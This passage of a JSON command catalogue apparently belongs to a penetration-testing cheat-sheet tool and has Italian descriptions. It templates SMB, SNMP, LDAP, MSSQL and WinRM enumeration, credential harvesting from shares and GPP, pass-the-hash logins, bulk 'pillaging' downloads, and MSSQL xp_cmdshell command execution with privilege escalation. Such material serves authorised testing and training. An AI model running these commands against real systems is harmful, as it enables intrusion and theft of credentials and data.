    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ssh"
    ],
    "tags": [
      "ssh",
      "auth"
    ],
    "template": "ssh -o PreferredAuthentications=none -o ConnectTimeout=5 <user>@<ip>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "nxc-smb-null",
    "name": "nxc smb — null session shares",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Null Session",
    "description": "Prova sempre la null session per prima: share guest/anonime sono sorprendentemente comuni.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "netexec",
      "smb",
      "null-session"
    ],
    "template": "nxc smb <ip> -u '' -p '' --shares",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "NetExec Wiki — SMB enumeration",
        "url": "https://www.netexec.wiki/smb-protocol/enumeration"
      },
      {
        "label": "HackTricks — 445 Pentesting SMB",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
      }
    ]
  },
  {
    "id": "smbclient-list",
    "name": "smbclient — list shares",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Null Session",
    "description": "Elenca le share con smbclient in null session (flag `-N`).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "smbclient",
      "shares"
    ],
    "template": "smbclient -N -L //<ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "smbclient-access",
    "name": "smbclient — access a share",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Null Session",
    "description": "Apre una share per navigarla (`ls`, `cd`, `get`, `mget`). Prova prima l'accesso anonimo, poi con le credenziali trovate.\n- `-N` = null session, niente password\n- `-U '<user>%<password>'` = login autenticato\n- `-c '...'` = esegue comandi senza entrare nella shell",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "smbclient",
      "shares",
      "access"
    ],
    "template": "smbclient //<ip>/<share> -N",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "share",
        "label": "Share",
        "placeholder": "Departments"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "anon",
        "label": "Anonimo",
        "template": "smbclient //<ip>/<share> -N",
        "description": "Accesso senza credenziali (null session)."
      },
      {
        "id": "creds",
        "label": "Con credenziali",
        "template": "smbclient //<ip>/<share> -U '<user>%<password>'",
        "description": "Accesso autenticato alla share."
      }
    ],
    "refs": [
      {
        "label": "smbclient — man page",
        "url": "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"
      }
    ]
  },
  {
    "id": "nxc-smb-shares",
    "name": "nxc smb — authenticated shares",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Elenca le share con i permessi READ/WRITE usando credenziali.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "smb",
      "shares"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' --shares",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --shares",
        "description": "Autenticazione con password."
      },
      {
        "id": "hash",
        "label": "NTLM hash",
        "template": "nxc smb <ip> -u '<user>' -H <hash> --shares",
        "description": "Pass-the-Hash con hash NTLM (niente password)."
      }
    ]
  },
  {
    "id": "enum4linux-ng",
    "name": "enum4linux-ng — full enum",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Utenti, gruppi, policy, share e sessioni: enum SMB completa in un colpo.",
    "platform": "linux",
    "requires": [
      "no-creds",
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "enum4linux",
      "smb"
    ],
    "template": "enum4linux-ng -A <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "anon",
        "label": "Anonimo",
        "template": "enum4linux-ng -A <ip>",
        "description": "Null session, senza credenziali. Su Windows moderni spesso restituisce poco."
      },
      {
        "id": "creds",
        "label": "Con credenziali",
        "template": "enum4linux-ng -A -u '<user>' -p '<password>' <ip>",
        "description": "Enum autenticata: supera le restrizioni sul null session e vede molto di più."
      }
    ]
  },
  {
    "id": "nxc-smb-rid",
    "name": "nxc smb — RID brute",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Enumera utenti/gruppi/computer via brute di SID/RID. Copertura migliore di `--users`.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "smb",
      "rid-brute"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' --rid-brute",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "nxc-smb-users",
    "name": "nxc smb — users + descriptions",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Utenti col campo description: spesso contiene password.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "smb",
      "users"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' --users",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "nxc-smb-groups",
    "name": "nxc smb — groups",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Enumera i gruppi di dominio. Con un nome elenca i membri di quel gruppo.\n- `--groups` = tutti i gruppi (senza argomento)\n- `--groups '<group>'` = membri di quel gruppo\n- `--local-groups` = gruppi locali della macchina",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "smb",
      "groups"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' --groups",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "group",
        "label": "Gruppo",
        "placeholder": "Domain Admins"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tutti i gruppi",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --groups",
        "description": "Elenca tutti i gruppi di dominio."
      },
      {
        "id": "members",
        "label": "Membri di un gruppo",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --groups '<group>'",
        "description": "Elenca i membri del gruppo indicato (es. `Domain Admins`)."
      },
      {
        "id": "local",
        "label": "Gruppi locali",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --local-groups",
        "description": "Gruppi locali della macchina, non di dominio."
      }
    ]
  },
  {
    "id": "nxc-smb-passpol",
    "name": "nxc smb — password policy",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Controlla la soglia di lockout PRIMA di lanciare un password spray.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "smb",
      "pass-pol"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' --pass-pol",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "nxc-smb-sessions",
    "name": "nxc smb — sessions & logged-on",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Authenticated Enum",
    "description": "Mostra chi è connesso: sessioni SMB attive e utenti loggati. Utile per capire dove sono gli admin, target per il movimento laterale.\n- `--loggedon-users` = utenti attualmente loggati (spesso serve admin locale)\n- `--smb-sessions` = sessioni SMB attive",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "smb",
      "sessions",
      "loggedon"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' --loggedon-users",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "loggedon",
        "label": "Utenti loggati",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --loggedon-users",
        "description": "Chi è loggato adesso sulla macchina."
      },
      {
        "id": "sessions",
        "label": "Sessioni SMB",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --smb-sessions",
        "description": "Sessioni SMB attive verso l'host."
      }
    ]
  },
  {
    "id": "nxc-smb-gpp",
    "name": "nxc smb — GPP password (MS14-025)",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Pillaging",
    "description": "Cerca password nei `Groups.xml` su `SYSVOL` (`cpassword` AES con chiave nota, `MS14-025`).",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "gpp",
      "sysvol",
      "ms14-025"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' -M gpp_password",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "gpp",
        "label": "GPP password",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M gpp_password",
        "description": "Password nei `Groups.xml` di `SYSVOL` (`cpassword` cifrato con chiave AES nota, `MS14-025`)."
      },
      {
        "id": "autologin",
        "label": "GPP autologin",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M gpp_autologin",
        "description": "Credenziali di autologon lasciate nei GPP (`Registry.xml`): utente e password in chiaro."
      }
    ]
  },
  {
    "id": "nxc-smb-spider",
    "name": "nxc smb — spider shares",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Pillaging",
    "description": "Con il modulo `spider_plus` elenca e (opzionalmente) scarica i file leggibili sulle share.\n- `-M spider_plus` = enumera i file e salva un JSON, senza scaricare\n- `-o DOWNLOAD_FLAG=true` = scarica i file\n- `-o OUTPUT_FOLDER=<dir>` = cartella locale dove salvarli\n- `--share '<share>'` = limita a una share",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "spider",
      "shares",
      "pillaging",
      "download"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' -M spider_plus",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "share",
        "label": "Share",
        "placeholder": "Departments"
      },
      {
        "key": "outdir",
        "label": "Output folder",
        "placeholder": "/home/kali/loot"
      }
    ],
    "variants": [
      {
        "id": "enum",
        "label": "Enumera",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M spider_plus",
        "description": "Solo elenco dei file leggibili su tutte le share (salva un JSON), niente download."
      },
      {
        "id": "enum-share",
        "label": "Enumera una share",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M spider_plus --share '<share>'",
        "description": "Limita l'enumerazione a una singola share."
      },
      {
        "id": "download",
        "label": "Scarica tutto",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=104857600 OUTPUT_FOLDER=<outdir>",
        "description": "Scarica tutti i file leggibili in `<outdir>`. `MAX_FILE_SIZE` alzato per non saltare i file grandi."
      },
      {
        "id": "download-share",
        "label": "Scarica una share",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --share '<share>' -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=104857600 OUTPUT_FOLDER=<outdir>",
        "description": "Scarica solo da una share specifica dentro `<outdir>`."
      }
    ],
    "note": "# Occhio ai file grandi\nDi default `spider_plus` scarica solo i file sotto i 50 KB (`MAX_FILE_SIZE=51200`). Per prendere tutto alza il limite, es. `MAX_FILE_SIZE=104857600` (100 MB). Il modulo non filtra per cartella: per una cartella precisa o un singolo file usa `smbclient` (`cd` + `mget`) oppure `--get-file <remoto> <locale>`."
  },
  {
    "id": "smbmap-r",
    "name": "smbmap — recursive listing",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Pillaging",
    "description": "Cammina ogni share in modo ricorsivo (profondità con `-R` / `--depth`).",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "smbmap",
      "shares",
      "pillaging"
    ],
    "template": "smbmap -H <ip> -u '<user>' -p '<password>' -R --depth 5",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "smbclient-mget",
    "name": "smbclient — recursive download",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Pillaging",
    "description": "Scarica un’intera share in modo ricorsivo.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "smbclient",
      "download"
    ],
    "template": "smbclient //<ip>/<share> -U '<user>%<password>' -c 'recurse; prompt; mget *'",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "share",
        "label": "Share",
        "placeholder": "Departments"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "onesixtyone",
    "name": "onesixtyone — community brute",
    "category": "service-enum",
    "subcategory": "snmp",
    "group": "Discovery",
    "description": "Bruteforce delle community string SNMP.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "snmp"
    ],
    "tags": [
      "onesixtyone",
      "snmp"
    ],
    "template": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "snmpwalk",
    "name": "snmpwalk — full walk",
    "category": "service-enum",
    "subcategory": "snmp",
    "group": "Enumeration",
    "description": "Scarica l'intero albero MIB (`.1`) via SNMP con una community valida. Ne escono utenti, processi, software installato, interfacce di rete, route e a volte credenziali in chiaro.\n- `-c <community>` = community string, funziona come una password (prova `public`/`private`)\n- `-v2c` = versione SNMP v2c",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "snmp"
    ],
    "tags": [
      "snmpwalk",
      "snmp"
    ],
    "template": "snmpwalk -v2c -c <community> <ip> .1",
    "params": [
      {
        "key": "community",
        "label": "Community",
        "placeholder": "public"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tutta la MIB",
        "template": "snmpwalk -v2c -c <community> <ip> .1",
        "description": "Walk completo dell’albero MIB."
      },
      {
        "id": "procs",
        "label": "Processi",
        "template": "snmpwalk -v2c -c <community> <ip> 1.3.6.1.2.1.25.4.2.1.2",
        "description": "Processi in esecuzione (hrSWRunName)."
      },
      {
        "id": "users",
        "label": "Utenti",
        "template": "snmpwalk -v2c -c <community> <ip> 1.3.6.1.4.1.77.1.2.25",
        "description": "Account utente (LanMan)."
      },
      {
        "id": "tcp",
        "label": "TCP aperte",
        "template": "snmpwalk -v2c -c <community> <ip> 1.3.6.1.2.1.6.13.1.3",
        "description": "Connessioni TCP locali."
      }
    ]
  },
  {
    "id": "smtp-userenum",
    "name": "smtp-user-enum — VRFY/RCPT",
    "category": "service-enum",
    "subcategory": "smtp",
    "group": "User Enumeration",
    "description": "Enumera utenti validi via comandi VRFY/EXPN/RCPT TO. Scegli il metodo in base a cosa il server lascia aperto.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smtp"
    ],
    "tags": [
      "smtp",
      "user-enum"
    ],
    "template": "smtp-user-enum -M VRFY -U <userlist> -t <ip>",
    "params": [
      {
        "key": "userlist",
        "label": "Userlist",
        "placeholder": "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "VRFY",
        "template": "smtp-user-enum -M VRFY -U <userlist> -t <ip>",
        "description": "Metodo VRFY: chiede al server se un utente esiste."
      },
      {
        "id": "rcpt",
        "label": "RCPT",
        "template": "smtp-user-enum -M RCPT -U <userlist> -D <domain> -t <ip>",
        "description": "Metodo `RCPT TO`: più affidabile quando `VRFY` è disabilitato. `-D` imposta il dominio."
      },
      {
        "id": "expn",
        "label": "EXPN",
        "template": "smtp-user-enum -M EXPN -U <userlist> -t <ip>",
        "description": "Metodo EXPN: espande alias e mailing list."
      }
    ]
  },
  {
    "id": "showmount",
    "name": "showmount — list exports",
    "category": "service-enum",
    "subcategory": "nfs",
    "group": "Discovery",
    "description": "Elenca gli export NFS condivisi.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "nfs"
    ],
    "tags": [
      "showmount",
      "nfs"
    ],
    "template": "showmount -e <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "mount-nfs",
    "name": "mount NFS share",
    "category": "service-enum",
    "subcategory": "nfs",
    "group": "Mounting",
    "description": "Monta una share NFS in locale (crea prima `/mnt/nfs`). Cerca file con `UID` che puoi impersonare.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "nfs"
    ],
    "tags": [
      "nfs",
      "mount"
    ],
    "template": "sudo mount -t nfs <ip>:<share> /mnt/nfs -o nolock",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "share",
        "label": "Share",
        "placeholder": "/exports/data"
      }
    ]
  },
  {
    "id": "ldap-anon",
    "name": "ldapsearch — anonymous bind",
    "category": "service-enum",
    "subcategory": "ldap",
    "group": "Anonymous",
    "description": "Bind LDAP anonimo: spesso espone l’intera directory AD. Parti dai `namingContexts` per scoprire il `Base DN`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "ldapsearch",
      "anonymous"
    ],
    "template": "ldapsearch -x -H ldap://<ip> -b \"\" -s base namingContexts",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "basedn",
        "label": "Base DN",
        "placeholder": "DC=corp,DC=local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "namingContexts",
        "template": "ldapsearch -x -H ldap://<ip> -b \"\" -s base namingContexts",
        "description": "Primo passo: legge i `namingContexts` per ricavare il `Base DN`."
      },
      {
        "id": "dump",
        "label": "Dump completo",
        "template": "ldapsearch -x -H ldap://<ip> -b \"<basedn>\" -s sub \"(objectClass=*)\"",
        "description": "Dump dell’intero albero, se il bind anonimo lo consente."
      }
    ]
  },
  {
    "id": "ldap-auth",
    "name": "ldapsearch — authenticated dump",
    "category": "service-enum",
    "subcategory": "ldap",
    "group": "Authenticated",
    "description": "Dump degli utenti con `description` (spesso password) e `userAccountControl`.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "ldapsearch",
      "users"
    ],
    "template": "ldapsearch -x -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b \"<basedn>\" \"(objectClass=user)\" sAMAccountName description memberOf userAccountControl",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "basedn",
        "label": "Base DN",
        "placeholder": "DC=corp,DC=local"
      }
    ]
  },
  {
    "id": "mssql-login",
    "name": "impacket — mssqlclient login",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Connection",
    "description": "Connessione via TDS. Usa `-windows-auth` per i login di dominio (Windows auth).",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "impacket",
      "mssql"
    ],
    "template": "impacket-mssqlclient <user>:<password>@<ip> -windows-auth",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "sa"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "mssql-roles",
    "name": "MSSQL — ruoli & privilegi",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Enumeration",
    "description": "Dentro la sessione MSSQL, capisci cosa puoi fare prima di attaccare. `IS_SRVROLEMEMBER('sysadmin')` torna `1` se sei sysadmin (xp_cmdshell diretto), `0` se no (serve un altro vettore, es. impersonation). L'ultima query elenca i login che puoi impersonare.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "mssql",
      "roles",
      "impersonate",
      "privesc"
    ],
    "template": "SELECT IS_SRVROLEMEMBER('sysadmin');",
    "params": [],
    "variants": [
      {
        "id": "sysadmin",
        "label": "Sei sysadmin?",
        "template": "SELECT IS_SRVROLEMEMBER('sysadmin');",
        "description": "`1` = sei sysadmin (xp_cmdshell diretto), `0` = no, `NULL` = nome ruolo scritto male."
      },
      {
        "id": "whoami",
        "label": "Identità corrente",
        "template": "SELECT SYSTEM_USER AS login, USER_NAME() AS db_user, IS_SRVROLEMEMBER('sysadmin') AS is_sa;",
        "description": "Login attuale, utente nel database e se sei sysadmin, in una riga."
      },
      {
        "id": "impersonate",
        "label": "Chi posso impersonare",
        "template": "SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';",
        "description": "Login su cui hai il permesso `IMPERSONATE`. Se compare `sa` o un sysadmin, puoi salire con `EXECUTE AS LOGIN`."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting MSSQL",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server.html"
      }
    ]
  },
  {
    "id": "mssql-xpcmdshell",
    "name": "MSSQL — xp_cmdshell RCE",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Exploitation",
    "description": "Abilita e invoca `xp_cmdshell` per RCE come account del servizio SQL.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "mssql",
      "xp_cmdshell",
      "rce"
    ],
    "template": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '<cmd>';",
    "params": [
      {
        "key": "cmd",
        "label": "Command",
        "placeholder": "whoami"
      }
    ]
  },
  {
    "id": "mssql-impersonate",
    "name": "MSSQL — impersonate sa",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Exploitation",
    "description": "Priv esc via grant `IMPERSONATE` (non serve essere `sysadmin`).",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "mssql",
      "impersonate"
    ],
    "template": "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; EXEC xp_cmdshell '<cmd>'; REVERT;",
    "params": [
      {
        "key": "cmd",
        "label": "Command",
        "placeholder": "whoami"
      }
    ]
  },
  {
    "id": "mssql-readfile",
    "name": "MSSQL — leggi file (OPENROWSET)",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Exploitation",
    "description": "Legge un file dal filesystem del server SQL come singolo blob di testo. Serve il permesso `ADMINISTER BULK OPERATIONS` o il ruolo `bulkadmin` (i sysadmin li hanno). Comodo per `web.config`, config, chiavi, flag.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "mssql",
      "file-read",
      "openrowset"
    ],
    "template": "SELECT * FROM OPENROWSET(BULK N'<path>', SINGLE_CLOB) AS Contents;",
    "params": [
      {
        "key": "path",
        "label": "Path file",
        "placeholder": "C:\\Windows\\System32\\drivers\\etc\\hosts"
      }
    ]
  },
  {
    "id": "evil-winrm",
    "name": "evil-winrm — shell",
    "category": "service-enum",
    "subcategory": "winrm",
    "group": "Shell",
    "description": "Shell PowerShell interattiva su WinRM. Auth con password / hash / ticket.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "winrm"
    ],
    "tags": [
      "evil-winrm",
      "winrm",
      "shell"
    ],
    "template": "evil-winrm -i <ip> -u '<user>' -p '<password>'",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "evil-winrm -i <ip> -u '<user>' -p '<password>'",
        "description": "Auth con password."
      },
      {
        "id": "hash",
        "label": "Pass-the-Hash",
        "template": "evil-winrm -i <ip> -u '<user>' -H '<hash>'",
        "description": "Auth con hash NTLM (PtH)."
      },
      {
        "id": "updownload",
        "label": "Upload/Download",
        "template": "evil-winrm -i <ip> -u '<user>' -p '<password>' -s /opt/scripts/ -e /opt/exe/",
        "description": "Nella shell usa `upload`/`download <file>`. -s monta una cartella di script PS, -e una di .exe da caricare in memoria."
      }
    ]
  },
  {
    "id": "xfreerdp",
    "name": "xfreerdp — RDP connect",
    "category": "service-enum",
    "subcategory": "rdp",
    "group": "Connection",
    "description": "RDP standard con risoluzione dinamica e clipboard.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "rdp"
    ],
    "tags": [
      "xfreerdp",
      "rdp"
    ],
    "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution /clipboard",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "hash",
        "label": "Hash NTLM",
        "ctx": "hash",
        "placeholder": "aad3b435..."
      },
      {
        "key": "fqdn",
        "label": "FQDN target",
        "placeholder": "dc01.corp.local"
      },
      {
        "key": "domain",
        "label": "Dominio",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ],
    "variants": [
